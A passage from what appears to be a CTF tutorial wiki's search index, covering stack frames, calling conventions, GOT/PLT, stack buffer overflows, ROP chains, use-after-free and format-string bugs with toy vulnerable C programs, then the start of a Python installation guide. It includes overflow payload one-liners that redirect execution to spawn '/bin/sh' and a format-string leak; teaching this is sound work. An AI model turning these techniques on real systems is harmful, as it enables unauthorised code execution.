offset relative to <code>ebp</code> rather than an offset to <code>esp</code>. A stack frame is essentially just the space used on the stack by a given function.</p>"},{"location":"CTF/PWN/#uses","title":"Uses","text":"<p>The stack is primarily used for a few things:</p> <ul> <li>Storing function arguments</li> <li>Storing local variables</li> <li>Storing processor state between function calls</li> </ul>"},{"location":"CTF/PWN/#example","title":"Example","text":"<p>Let's see what the stack looks like right after <code>say_hi</code> has been called in this 32-bit x86 C program:</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid say_hi(const char * name) {\n    printf(\"Hello %s!\\n\", name);\n}\n\nint main(int argc, char ** argv) {\n    char * name;\n    if (argc != 2) {\n        return 1;\n    }\n    name = argv[1];\n    say_hi(name);\n    return 0;\n}\n</code></pre> <p>And the relevant assembly:</p> <pre><code>0804840b &lt;say_hi&gt;:\n 804840b:   55                      push   ebp\n 804840c:   89 e5                   mov    ebp,esp\n 804840e:   83 ec 08                sub    esp,0x8\n 8048411:   83 ec 08                sub    esp,0x8\n 8048414:   ff 75 08                push   DWORD PTR [ebp+0x8]\n 8048417:   68 f0 84 04 08          push   0x80484f0\n 804841c:   e8 bf fe ff ff          call   80482e0 &lt;printf@plt&gt;\n 8048421:   83 c4 10                add    esp,0x10\n 8048424:   90                      nop\n 8048425:   c9                      leave\n 8048426:   c3                      ret\n\n08048427 &lt;main&gt;:\n 8048427:   8d 4c 24 04             lea    ecx,[esp+0x4]\n 804842b:   83 e4 f0                and    esp,0xfffffff0\n 804842e:   ff 71 fc                push   DWORD PTR [ecx-0x4]\n 8048431:   55                      push   ebp\n 8048432:   89 e5                   mov    ebp,esp\n 8048434:   51                      push   ecx\n 8048435:   83 ec 14                sub    esp,0x14\n 8048438:   89 c8                   mov    eax,ecx\n 804843a:   83 38 02                cmp    DWORD PTR [eax],0x2\n 804843d:   74 07                   je     8048446 &lt;main+0x1f&gt;\n 804843f:   b8 01 00 00 00          mov    eax,0x1\n 8048444:   eb 1c                   jmp    8048462 &lt;main+0x3b&gt;\n 8048446:   8b 40 04                mov    eax,DWORD PTR [eax+0x4]\n 8048449:   8b 40 04                mov    eax,DWORD PTR [eax+0x4]\n 804844c:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax\n 804844f:   83 ec 0c                sub    esp,0xc\n 8048452:   ff 75 f4                push   DWORD PTR [ebp-0xc]\n 8048455:   e8 b1 ff ff ff          call   804840b &lt;say_hi&gt;\n 804845a:   83 c4 10                add    esp,0x10\n 804845d:   b8 00 00 00 00          mov    eax,0x0\n 8048462:   8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]\n 8048465:   c9                      leave\n 8048466:   8d 61 fc                lea    esp,[ecx-0x4]\n 8048469:   c3                      ret\n</code></pre> <p>Skipping over the bulk of <code>main</code>, you'll see that at <code>0x8048452</code> <code>main</code>'s <code>name</code> local is pushed to the stack because it's the first argument to <code>say_hi</code>. Then, a <code>call</code> instruction is executed. <code>call</code> instructions first push the current instruction pointer to the stack, then jump to their destination. So when the processor begins executing <code>say_hi</code> at <code>0x0804840b</code>, the stack looks like this:</p> <pre><code>EIP = 0x0804840b (push ebp)\nESP = 0xffff0000\nEBP = 0xffff002c\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\nESP -&gt;  0xffff0000: 0x0804845a              // Return address for say_hi\n</code></pre> <p>The first thing <code>say_hi</code> does is save the current <code>ebp</code> so that when it returns, <code>ebp</code> is back where <code>main</code> expects it to be. The stack now looks like this:</p> <pre><code>EIP = 0x0804840c (mov ebp, esp)\nESP = 0xfffefffc\nEBP = 0xffff002c\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\n        0xffff0000: 0x0804845a              // Return address for say_hi\nESP -&gt;  0xfffefffc: 0xffff002c              // Saved EBP\n</code></pre> <p>Again, note how <code>esp</code> gets smaller when values are pushed to the stack.</p> <p>Next, the current <code>esp</code> is saved into <code>ebp</code>, marking the top of the new stack frame.</p> <pre><code>EIP = 0x0804840e (sub esp, 0x8)\nESP = 0xfffefffc\nEBP = 0xfffefffc\n\n            0xffff0004: 0xffffa0a0              // say_hi argument 1\n            0xffff0000: 0x0804845a              // Return address for say_hi\nESP, EBP -&gt; 0xfffefffc: 0xffff002c              // Saved EBP\n</code></pre> <p>Then, the stack is \"grown\" to accommodate local variables inside <code>say_hi</code>.</p> <pre><code>EIP = 0x08048414 (push [ebp + 0x8])\nESP = 0xfffeffec\nEBP = 0xfffefffc\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\n        0xffff0000: 0x0804845a              // Return address for say_hi\nEBP -&gt;  0xfffefffc: 0xffff002c              // Saved EBP\n        0xfffefff8: UNDEFINED\n        0xfffefff4: UNDEFINED\n        0xfffefff0: UNDEFINED\nESP -&gt;  0xfffefffc: UNDEFINED\n</code></pre> <p>NOTE: stack space is not implicitly cleared!</p> <p>Now, the 2 arguments to <code>printf</code> are pushed in reverse order.</p> <pre><code>EIP = 0x0804841c (call printf@plt)\nESP = 0xfffeffe4\nEBP = 0xfffefffc\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\n        0xffff0000: 0x0804845a              // Return address for say_hi\nEBP -&gt;  0xfffefffc: 0xffff002c              // Saved EBP\n        0xfffefff8: UNDEFINED\n        0xfffefff4: UNDEFINED\n        0xfffefff0: UNDEFINED\n        0xfffeffec: UNDEFINED\n        0xfffeffe8: 0xffffa0a0              // printf argument 2\nESP -&gt;  0xfffeffe4: 0x080484f0              // printf argument 1\n</code></pre> <p>Finally, <code>printf</code> is called, which pushes the address of the next instruction to execute.</p> <pre><code>EIP = 0x080482e0\nESP = 0xfffeffe4\nEBP = 0xfffefffc\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\n        0xffff0000: 0x0804845a              // Return address for say_hi\nEBP -&gt;  0xfffefffc: 0xffff002c              // Saved EBP\n        0xfffefff8: UNDEFINED\n        0xfffefff4: UNDEFINED\n        0xfffefff0: UNDEFINED\n        0xfffeffec: UNDEFINED\n        0xfffeffe8: 0xffffa0a0              // printf argument 2\n        0xfffeffe4: 0x080484f0              // printf argument 1\nESP -&gt;  0xfffeffe0: 0x08048421              // Return address for printf\n</code></pre> <p>Once <code>printf</code> has returned, the <code>leave</code> instruction moves <code>ebp</code> into <code>esp</code>, and pops the saved EBP.</p> <pre><code>EIP = 0x08048426 (ret)\nESP = 0xfffefffc\nEBP = 0xffff002c\n\n        0xffff0004: 0xffffa0a0              // say_hi argument 1\nESP -&gt;  0xffff0000: 0x0804845a              // Return address for say_hi\n</code></pre> <p>And finally, <code>ret</code> pops the saved instruction pointer into <code>eip</code> which causes the program to return to main with the same <code>esp</code>, <code>ebp</code>, and stack contents as when <code>say_hi</code> was initially called.</p> <pre><code>EIP = 0x0804845a (add esp, 0x10)\nESP = 0xffff0000\nEBP = 0xffff002c\n\nESP -&gt;  0xffff0004: 0xffffa0a0              // say_hi argument 1\n</code></pre>"},{"location":"CTF/PWN/#calling-conventions","title":"Calling Conventions","text":"<p>To be able to call functions, there needs to be an agreed-upon way to pass arguments. If a program is entirely self-contained in a binary, the compiler would be free to decide the calling convention. However, in reality, shared libraries are used so that common code (e.g. libc) can be stored once and dynamically linked into programs that need it, reducing program size.</p> <p>In Linux binaries, there are really only two commonly used calling conventions: cdecl for 32-bit binaries, and SysV for 64-bit</p>"},{"location":"CTF/PWN/#cdecl","title":"cdecl","text":"<p>In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order. A function like this:</p> <pre><code>int add(int a, int b, int c) {\n    return a + b + c;\n}\n</code></pre> <p>would be invoked by pushing <code>c</code>, then <code>b</code>, then <code>a</code>.</p>"},{"location":"CTF/PWN/#sysv","title":"SysV","text":"<p>For 64-bit binaries, function arguments are first passed in certain registers:</p> <ol> <li>RDI</li> <li>RSI</li> <li>RDX</li> <li>RCX</li> <li>R8</li> <li>R9</li> </ol> <p>then any leftover arguments are pushed onto the stack in reverse order, as in cdecl.</p>"},{"location":"CTF/PWN/#other-conventions","title":"Other Conventions","text":"<p>Any method of passing arguments could be used as long as the compiler is aware of what the convention is. As a result, there have been many calling conventions in the past that aren't used frequently anymore. See Wikipedia for a comprehensive list.</p>"},{"location":"CTF/PWN/#got","title":"GOT","text":"<p>The Global Offset Table (or GOT) is a section inside of programs that hold addresses of functions that are dynamically linked. As mentioned in the page on calling conventions, most programs don't include every function they use to reduce binary size. Instead, common functions (like those in libc) are \"linked\" into the program so they can be saved once on disk and reused by every program.</p> <p>Unless a program is marked full RELRO, the resolution of the function to address in a dynamic library is done lazily. All dynamic libraries are loaded into memory along with the main program at launch, however, functions are not mapped to their actual code until they're first called. For example, in the following C snippet <code>puts</code> won't be resolved to an address in libc until after it has been called once:</p> <pre><code>int main() {\n    puts(\"Hi there!\");\n    puts(\"Ok bye now.\");\n    return 0;\n}\n</code></pre> <p>To avoid searching through shared libraries each time a function is called, the result of the lookup is saved into the GOT so future function calls \"short circuit\" straight to their implementation bypassing the dynamic resolver.</p> <p>This has two important implications:</p> <ol> <li>The GOT contains pointers to libraries which move around due to ASLR</li> <li>The GOT is writable</li> </ol> <p>These two facts will become very useful to use in Return Oriented Programming</p>"},{"location":"CTF/PWN/#plt","title":"PLT","text":"<p>Before the address of a function has been resolved, the GOT points to an entry in the Procedure Linkage Table (PLT). This is a small \"stub\" function that is responsible for calling the dynamic linker with (effectively) the name of the function that should be resolved.</p>"},{"location":"CTF/PWN/#buffers","title":"Buffers","text":"<p>A buffer is any allocated space in memory where data (often user input) can be stored. For example, in the following C program <code>name</code> would be considered a stack buffer:</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char name[64] = {0};\n    read(0, name, 63);\n    printf(\"Hello %s\", name);\n    return 0;\n}\n</code></pre> <p>Buffers could also be global variables:</p> <pre><code>#include &lt;stdio.h&gt;\n\nchar name[64] = {0};\n\nint main() {\n    read(0, name, 63);\n    printf(\"Hello %s\", name);\n    return 0;\n}\n</code></pre> <p>Or dynamically allocated on the heap:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    char *name = malloc(64);\n    memset(name, 0, 64);\n    read(0, name, 63);\n    printf(\"Hello %s\", name);\n    return 0;\n}\n</code></pre>"},{"location":"CTF/PWN/#exploits","title":"Exploits","text":"<p>Given that buffers commonly hold user input, mistakes when writing to them could result in attacker-controlled data being written outside of the buffer's space. See the page on buffer overflows for more.</p>"},{"location":"CTF/PWN/#buffer-overflow","title":"Buffer Overflow","text":"<p>A Buffer Overflow is a vulnerability in which data can be written that exceeds the allocated space, allowing an attacker to overwrite other data.</p>"},{"location":"CTF/PWN/#stack-buffer-overflow","title":"Stack buffer overflow","text":"<p>The simplest and most common buffer overflow is one where the buffer is on the stack. Let's look at an example.</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    int secret = 0xdeadbeef;\n    char name[100] = {0};\n    read(0, name, 0x100);\n    if (secret == 0x1337) {\n        puts(\"Wow! Here's a secret.\");\n    } else {\n        puts(\"I guess you're not cool enough to see my secret\");\n    }\n}\n</code></pre> <p>There's a tiny mistake in this program which will allow us to see the secret. <code>name</code> is decimal 100 bytes, however, we're reading in hex 100 bytes (=256 decimal bytes)! Let's see how we can use this to our advantage.</p> <p>If the compiler chose to layout the stack like this:</p> <pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP\n        0xffff0068: 0xffff0100  // Saved EBP\n        0xffff0064: 0xdeadbeef  // secret\n...\n        0xffff0004: 0x0\nESP -&gt;  0xffff0000: 0x0         // name\n</code></pre> <p>let's look at what happens when we read in 0x100 bytes of 'A's.</p> <p>The first decimal 100 bytes are saved properly:</p> <pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP\n        0xffff0068: 0xffff0100  // Saved EBP\n        0xffff0064: 0xdeadbeef  // secret\n...\n        0xffff0004: 0x41414141\nESP -&gt;  0xffff0000: 0x41414141  // name\n</code></pre> <p>However, when the 101st byte is read in, we see an issue:</p> <pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP\n        0xffff0068: 0xffff0100  // Saved EBP\n        0xffff0064: 0xdeadbe41  // secret\n...\n        0xffff0004: 0x41414141\nESP -&gt;  0xffff0000: 0x41414141  // name\n</code></pre> <p>The least significant byte of the <code>secret</code> has been overwritten! If we follow the next 3 bytes to be read in, we'll see the entirety of the <code>secret</code> is \"clobbered\" with our 'A's</p> <pre><code>        0xffff006c: 0xf7f7f7f7  // Saved EIP\n        0xffff0068: 0xffff0100  // Saved EBP\n        0xffff0064: 0x41414141  // secret\n...\n        0xffff0004: 0x41414141\nESP -&gt;  0xffff0000: 0x41414141  // name\n</code></pre> <p>The remaining 152 bytes would continue clobbering values up the stack.</p>"},{"location":"CTF/PWN/#passing-an-impossible-check","title":"Passing an impossible check","text":"<p>How can we use this to pass the seemingly impossible check in the original program? Well, if we carefully line up our input so that the bytes that overwrite the <code>secret</code> happen to be the bytes that represent 0x1337 in Little Endian, we'll see the secret message.</p> <p>A small Python one-liner will work nicely: <code>python -c \"print 'A'*100 + '\\x31\\x13\\x00\\x00'\"</code></p> <p>This will fill the <code>name</code> buffer with 100 'A's, then overwrite the <code>secret</code> with the 32-bit little-endian encoding of 0x1337.</p>"},{"location":"CTF/PWN/#going-one-step-further","title":"Going one step further","text":"<p>As discussed on the stack page, the instruction that the current function should jump to when it is done is also saved on the stack (denoted as \"Saved EIP\" in the above stack diagrams). If we can overwrite this, we can control where the program jumps after the <code>main</code> finishes running, giving us the ability to control what the program does entirely.</p> <p>Usually, the end objective in binary exploitation is to get a shell (often called \"popping a shell\") on the remote computer. The shell provides us with an easy way to run anything we want on the target computer.</p> <p>Say there happens to be a nice function that does this define somewhere else in the program that we normally can't get to:</p> <pre><code>void give_shell() {\n    system(\"/bin/sh\");\n}\n</code></pre> <p>Well with our buffer overflow knowledge, now we can! All we have to do is overwrite the saved EIP on the stack to the address where <code>give_shell</code> is. Then, when the main returns, it will pop that address off of the stack and jump to it, running <code>give_shell</code>, and giving us our shell.</p> <p>Assuming <code>give_shell</code> is at 0x08048fd0, we could use something like this: <code>python -c \"print 'A'*108 + '\\xd0\\x8f\\x04\\x08'\"</code></p> <p>We send 108 'A's to overwrite the 100 bytes that are allocated for the <code>name</code>, the 4 bytes for <code>secret</code>, and the 4 bytes for the saved EBP. Then we simply send the little-endian form of <code>give_shell</code>'s address, and we would get a shell!</p> <p>This idea is extended on in Return Oriented Programming</p>"},{"location":"CTF/PWN/#return-oriented-programming","title":"Return Oriented Programming","text":"<p>Return Oriented Programming (or ROP) is the idea of chaining together small snippets of assembly with stack control to cause the program to do more complex things.</p> <p>As we saw in buffer overflows, having stack control can be very powerful since it allows us to overwrite saved instruction pointers, giving us control over what the program does next. Most programs don't have a convenient <code>give_shell</code> function, however, so we need to find a way to manually invoke the <code>system</code> or another <code>exec</code> function to get us our shell.</p>"},{"location":"CTF/PWN/#32-bit","title":"32 bit","text":"<p>Imagine we have a program similar to the following:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nchar name[32];\n\nint main() {\n    printf(\"What's your name? \");\n    read(0, name, 32);\n\n    printf(\"Hi %s\\n\", name);\n\n    printf(\"The time is currently \");\n    system(\"/bin/date\");\n\n    char echo[100];\n    printf(\"What do you want me to echo back? \");\n    read(0, echo, 1000);\n    puts(echo);\n\n    return 0;\n}\n</code></pre> <p>We obviously have a stack buffer overflow on the <code>echo</code> variable which can give us EIP control when the <code>main</code> returns. But we don't have a <code>give_shell</code> function! So what can we do?</p> <p>We can call the <code>system</code> with an argument we control! Since arguments are passed in on the stack in 32-bit Linux programs (see calling conventions), if we have stack control, we have argument control.</p> <p>When the main returns, we want our stack to look like something normally called <code>system</code>. Recall what is on the stack after a function has been called:</p> <pre><code>        ...                                 // More arguments\n        0xffff0008: 0x00000002              // Argument 2\n        0xffff0004: 0x00000001              // Argument 1\nESP -&gt;  0xffff0000: 0x080484d0              // Return address\n</code></pre> <p>So the <code>main</code>'s stack frame needs to look like this:</p> <pre><code>        0xffff0008: 0xdeadbeef              // system argument 1\n        0xffff0004: 0xdeadbeef              // return address for system\nESP -&gt;  0xffff0000: 0x08048450              // return address for main (system's PLT entry)\n</code></pre> <p>Then when the <code>main</code> returns, it will jump into the <code>system</code>'s PLT entry and the stack will appear just like the <code>system</code> had been called normally for the first time.</p> <p>Note: we don't care about the return address <code>system</code> will return to because we will have already gotten our shell by then!</p>"},{"location":"CTF/PWN/#arguments","title":"Arguments","text":"<p>This is a good start, but we need to pass an argument to the <code>system</code> for anything to happen. As mentioned in the page on ASLR, the stack and dynamic libraries \"move around\" each time a program is run, which means we can't easily use data on the stack or a string in libc for our argument. In this case, however, we have a very convenient <code>name</code> global which will be at a known location in the binary (in the BSS segment).</p>"},{"location":"CTF/PWN/#putting-it-together","title":"Putting it together","text":"<p>Our exploit will need to do the following:</p> <ol> <li>Enter \"sh\" or another command to run as the <code>name</code></li> <li>Fill the stack with</li> <li>Garbage up to the saved EIP</li> <li>The address of the <code>system</code>'s PLT entry</li> <li>A fake return address for the system to jump to when it's done</li> <li>The address of the <code>name</code> global acts as the first argument to the <code>system</code></li> </ol>"},{"location":"CTF/PWN/#64-bit","title":"64 bit","text":"<p>In 64-bit binaries, we have to work a bit harder to pass arguments to functions. The basic idea of overwriting the saved RIP is the same, but as discussed in calling conventions, arguments are passed in registers in 64-bit programs. In the case of running the <code>system</code>, this means we will need to find a way to control the RDI register.</p> <p>To do this, we'll use small snippets of assembly in the binary, called \"gadgets.\" These gadgets usually <code>pop</code> one or more registers off of the stack, and then call <code>ret</code>, which allows us to chain them together by making a large fake call stack.</p> <p>For example, if we needed control of both RDI and RSI, we might find two gadgets in our program that look like this (using a tool like rp++ or ROPgadget):</p> <pre><code>0x400c01: pop rdi; ret\n0x400c03: pop rsi; pop r15; ret\n</code></pre> <p>We can set up a fake call stack with these gadgets to sequentially execute them, <code>pop</code>ing values we control into registers, and then end with a jump to the <code>system</code>.</p>"},{"location":"CTF/PWN/#example_1","title":"Example","text":"<pre><code>        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled\n        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)\n        0xffff0018: 0x1337beef          // value we want in rsi\n        0xffff0010: 0x400c03            // address that the rdi gadget's ret will return to - the pop rsi gadget\n        0xffff0008: 0xdeadbeef          // value to be popped into rdi\nRSP -&gt;  0xffff0000: 0x400c01            // address of rdi gadget\n</code></pre> <p>Stepping through this one instruction at a time, <code>main</code> returns, jumping to our <code>pop rdi</code> gadget:</p> <pre><code>RIP = 0x400c01 (pop rdi)\nRDI = UNKNOWN\nRSI = UNKNOWN\n\n        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled\n        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)\n        0xffff0018: 0x1337beef          // value we want in rsi\n        0xffff0010: 0x400c03            // address that the rdi gadget's ret will return to - the pop rsi gadget\nRSP -&gt;  0xffff0008: 0xdeadbeef          // value to be popped into rdi\n</code></pre> <p><code>pop rdi</code> is then executed, popping the top of the stack into RDI:</p> <pre><code>RIP = 0x400c02 (ret)\nRDI = 0xdeadbeef\nRSI = UNKNOWN\n\n        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled\n        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)\n        0xffff0018: 0x1337beef          // value we want in rsi\nRSP -&gt;  0xffff0010: 0x400c03            // address that the rdi gadget's ret will return to - the pop rsi gadget\n</code></pre> <p>The RDI gadget then <code>ret</code>s into our RSI gadget:</p> <pre><code>RIP = 0x400c03 (pop rsi)\nRDI = 0xdeadbeef\nRSI = UNKNOWN\n\n        0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled\n        0xffff0020: 0x1337beef          // value we want in r15 (probably garbage)\nRSP -&gt;  0xffff0018: 0x1337beef          // value we want in rsi\n</code></pre> <p>RSI and R15 are popped:</p> <pre><code>RIP = 0x400c05 (ret)\nRDI = 0xdeadbeef\nRSI = 0x1337beef\n\nRSP -&gt;  0xffff0028: 0x400d00            // where we want the rsi gadget's ret to jump to now that rdi and rsi are controlled\n</code></pre> <p>And finally, the RSI gadget <code>ret</code>s, jumping to whatever function we want, but now with RDI and RSI set to values we control.</p>"},{"location":"CTF/PWN/#binary-security","title":"Binary Security","text":"<p>Binary Security is using tools and methods in order to secure programs from being manipulated and exploited. These tools are not infallible, but when used together and implemented properly, they can raise the difficulty of exploitation greatly.</p> <p>Some methods covered include:</p> <ul> <li>No eXecute (NX)</li> <li>Address Space Layout Randomization (ASLR)</li> <li>Relocation Read-Only (RELRO)</li> <li>Stack Canaries/Cookies</li> </ul>"},{"location":"CTF/PWN/#the-heap","title":"The Heap","text":"<p>A heap is a place in memory that a program can use to dynamically create objects. Creating objects on the heap has some advantages compared to using the stack:</p> <ul> <li>Heap allocations can be dynamically sized</li> <li>Heap allocations \"persist\" when a function returns</li> </ul> <p>There are also some disadvantages, however:</p> <ul> <li>Heap allocations can be slower</li> <li>Heap allocations must be manually cleaned up</li> </ul>"},{"location":"CTF/PWN/#using-the-heap","title":"Using the heap","text":"<p>In C, there are a number of functions used to interact with the heap, but we're going to focus on the two core ones:</p> <ul> <li><code>malloc</code>: allocate <code>n</code> bytes on the heap</li> <li><code>free</code>: free the given allocation</li> </ul> <p>Let's see how these could be used in a program:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    unsigned alloc_size = 0;\n    char *stuff;\n\n    printf(\"Number of bytes? \");\n    scanf(\"%u\", &amp;alloc_size);\n\n    stuff = malloc(alloc_size + 1);\n    memset(0, stuff, alloc_size + 1);\n\n    read(0, stuff, alloc_size);\n\n    printf(\"You wrote: %s\", stuff);\n\n    free(stuff);\n\n    return 0;\n}\n</code></pre> <p>This program reads in a size from the user, creates an allocation of that size on the heap, reads in that many bytes, then prints it back out to the user.</p>"},{"location":"CTF/PWN/#heap-exploits","title":"Heap Exploits","text":""},{"location":"CTF/PWN/#overflow","title":"Overflow","text":"<p>Much like a stack buffer overflow, a heap overflow is a vulnerability where more data than can fit in the allocated buffer is read in. This could lead to heap metadata corruption, or corruption of other heap objects, which could in turn provide a new attack surface.</p>"},{"location":"CTF/PWN/#use-after-free-uaf","title":"Use After Free (UAF)","text":"<p>Once <code>free</code> is called on an allocation, the allocator is free to reallocate that chunk of memory in future calls to <code>malloc</code> if it so chooses. However, if the program author isn't careful and uses the freed object later on, the contents may be corrupt (or even attacker controlled). This is called use after free or UAF.</p>"},{"location":"CTF/PWN/#example_2","title":"Example","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct string {\n    unsigned length;\n    char *data;\n} string;\n\nint main() {\n    struct string* s = malloc(sizeof(string));\n    puts(\"Length:\");\n    scanf(\"%u\", &amp;s-&gt;length);\n    s-&gt;data = malloc(s-&gt;length + 1);\n    memset(s-&gt;data, 0, s-&gt;length + 1);\n    puts(\"Data:\");\n    read(0, s-&gt;data, s-&gt;length);\n\n    free(s-&gt;data);\n    free(s);\n\n    char *s2 = malloc(16);\n    memset(s2, 0, 16);\n    puts(\"More data:\");\n    read(0, s2, 15);\n\n    // Now using s again, a UAF\n\n    puts(s-&gt;data);\n\n    return 0;\n}\n</code></pre> <p>In this example, we have a <code>string</code> structure with a length and a pointer to the actual string data. We properly allocate, fill, and then free an instance of this structure. Then we make another allocation, fill it, and then improperly reference the freed <code>string</code>. Due to how Glibc's allocator works, <code>s2</code> will actually get the same memory as the original <code>s</code> allocation, which in turn gives us the ability to control the <code>s-&gt;data</code> pointer. This could be used to leak program data.</p>"},{"location":"CTF/PWN/#advanced-heap-exploitation","title":"Advanced Heap Exploitation","text":"<p>Not only can the heap be exploited by the data in allocations, but exploits can also use the underlying mechanisms in <code>malloc</code>, <code>free</code>, etc. to exploit a program. This is beyond the scope of CTF 101, but here are a few recommended resources:</p> <ul> <li>sploitFUN's glibc overview</li> <li>Shellphish's how2heap</li> </ul>"},{"location":"CTF/PWN/#format-string-vulnerability","title":"Format String Vulnerability","text":"<p>A format string vulnerability is a bug where user input is passed as the format argument to <code>printf</code>, <code>scanf</code>, or another function in that family.</p> <p>The format argument has many different specifies which could allow an attacker to leak data if they control the format argument to <code>printf</code>. Since <code>printf</code> and similar are variadic functions, they will continue popping data off of the stack according to the format.</p> <p>For example, if we can make the format argument \"%x.%x.%x.%x\", <code>printf</code> will pop off four stack values and print them in hexadecimal, potentially leaking sensitive information.</p> <p><code>printf</code> can also index to an arbitrary \"argument\" with the following syntax: \"%n$x\" (where <code>n</code> is the decimal index of the argument you want).</p> <p>While these bugs are powerful, they're very rare nowadays, as all modern compilers warn when <code>printf</code> is called with a non-constant string.</p>"},{"location":"CTF/PWN/#example_3","title":"Example","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n    int secret_num = 0x8badf00d;\n\n    char name[64] = {0};\n    read(0, name, 64);\n    printf(\"Hello \");\n    printf(name);\n    printf(\"! You'll never get my secret!\\n\");\n    return 0;\n}\n</code></pre> <p>Due to how GCC decided to lay out the stack, <code>secret_num</code> is actually at a lower address on the stack than <code>name</code>, so we only have to go to the 7th \"argument\" in <code>printf</code> to leak the secret:</p> <pre><code>$ ./fmt_string\n%7$llx\nHello 8badf00d3ea43eef\n! You'll never get my secret!\n</code></pre>"},{"location":"CTF/Python_1/","title":"Python Programming Quick Guide - Installation and Basic IO","text":"<p>https://www.liaoxuefeng.com/wiki/1016959663602400</p> <p>https://www.w3schools.com/python/python_intro.asp</p> <p>https://docs.python.org/3/</p>"},{"location":"CTF/Python_1/#what-is-python","title":"What is Python?","text":"<p>Python is a popular programming language. It was created by Guido van Rossum, and released in 1991.</p> <p>It is used for:</p> <ul> <li>web development (server-side),</li> <li>software development,</li> <li>mathematics,</li> <li>system scripting.</li> </ul>"},{"location":"CTF/Python_1/#what-can-python-do","title":"What can Python do?","text":"<ul> <li>Python can be used on a server to create web applications.</li> <li>Python can be used alongside software to create workflows.</li> <li>Python can connect to database systems. It can also read and modify files.</li> <li>Python can be used to handle big data and perform complex mathematics.</li> <li>Python can be used for rapid prototyping, or for production-ready software development.</li> </ul>"},{"location":"CTF/Python_1/#why-python","title":"Why Python?","text":"<ul> <li>Python works on different platforms (Windows, Mac, Linux, Raspberry Pi, etc).</li> <li>Python has a simple syntax similar to the English language.</li> <li>Python has a syntax that allows developers to write programs with fewer lines than some other programming languages.</li> <li>Python runs on an interpreter system, meaning that code can be executed as soon as it is written. This means that prototyping can be very quick.</li> <li>Python can be treated in a procedural way, an object-oriented way, or a functional way.</li> </ul>"},{"location":"CTF/Python_1/#good-to-know","title":"Good to know","text":"<ul> <li>The most recent major version of Python is Python 3, which we shall be using in this tutorial. However, Python 2, although not being updated with anything other than security updates, is still quite popular.</li> <li>In this tutorial, Python will be written in a text editor. It is possible to write Python in an Integrated Development Environment, such as Thonny, Pycharm, Netbeans, or Eclipse which are particularly useful when managing larger collections of Python files.</li> </ul>"},{"location":"CTF/Python_1/#python-syntax-compared-to-other-programming-languages","title":"Python Syntax compared to other programming languages","text":"<ul> <li>Python was designed for readability, and has some similarities to the English language with influence from mathematics.</li> <li>Python uses new lines to complete a command, as opposed to other programming languages which often use semicolons or parentheses.</li> <li>Python relies on indentation, using whitespace, to define scope; such as the scope of loops, functions, and classes. Other programming languages often use curly brackets for this purpose.</li> </ul>"},{"location":"CTF/Python_1/#example","title":"Example","text":"<pre><code>print(\"Hello, World!\")\n</code></pre>"},{"location":"CTF/Python_1/#installing-python","title":"Installing Python","text":"<p>Because Python is cross-platform, it can run on Windows, Mac, and various Linux/Unix systems. Python programs written on Windows are capable of running when put on Linux.</p> <p>To start learning Python programming, you first have to install Python into your computer. Once installed, you'll get the Python interpreter (which is responsible for running Python programs), a command line interactive environment, and a simple integrated development environment.</p>"},{"location":"CTF/Python_1/#installing-python-38","title":"Installing Python 3.8","text":"<p>Currently, there are two versions of Python, version 2.x and version 3.x, which are incompatible. Since version 3.x is becoming more and more popular, our tutorial will be based on the latest Python version 3.8. Please make sure that the version of Python installed on your computer is the latest 3.8.x so that you can learn this tutorial painlessly.</p>"},{"location":"CTF/Python_1/#installing-python-on-a-mac","title":"Installing Python on a Mac","text":"<p>If you are using a Mac with OS X&gt;=10.9, the version of Python that comes with the system is 2.7. To install the latest Python 3.8, there are two methods.</p> <p>Method 1: Download the installer for Python 3.8 from the official Python website, double-click it after downloading and run it and install it.</p> <p>Method 2: If Homebrew is installed, just install it directly via the command <code>brew install python3</code>.</p>"},{"location":"CTF/Python_1/#installing-python-on-linux","title":"Installing Python on Linux","text":"<p>If you are using Linux, then I can assume that you have Linux system administration experience and should have no problem installing Python 3 on your own, otherwise, switch back to Windows.</p> <p>For a large number of students who are currently still using Windows, if you have no plans to switch to a Mac soon, you can continue reading below.</p>"},{"location":"CTF/Python_1/#installing-python-on-windows","title":"Installing Python on Windows","text":"<p>First, depending on your version of Windows (64-bit or 32-bit), download the 64-bit installer or 32-bit installer, then, run the downloaded exe installer:</p> <p></p> <p>Pay special attention to checking <code>Add Python 3.8 to PATH</code>, and then click <code>Install Now</code> to complete the installation.</p>"},{"location":"CTF/Python_1/#run-python","title":"Run Python","text":"<p>After successful installation, open a command prompt window and type in python, two cases will appear.</p> <p>Scenario one.</p> 